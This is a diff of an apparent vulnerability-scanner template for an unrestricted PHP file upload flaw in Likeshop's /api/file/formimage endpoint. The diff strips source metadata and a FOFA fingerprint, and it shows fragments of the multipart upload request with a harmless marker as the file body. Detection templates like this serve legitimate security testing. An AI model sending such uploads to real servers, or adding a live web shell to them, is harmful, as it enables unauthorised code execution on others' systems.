@@ -3,12 +3,8 @@ info:
   name: Likeshop HTTP POST 请求 File.php userFormImage 无限制上传漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zhf4rek87u8iaczv'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zhf4rek87u8iaczv
-    fofa: icon_hash="874152924"
 http:
 - raw:
   - 'POST /api/file/formimage HTTP/1.1
@@ -23,8 +19,6 @@ http:
     Accept-Encoding: gzip
 
 
-
-
     ------WebKitFormBoundarygcflwtei
 
 
@@ -32,8 +26,6 @@ http:
 
 
     Content-Type: application/x-php
-
-
 
 
     dudesuite
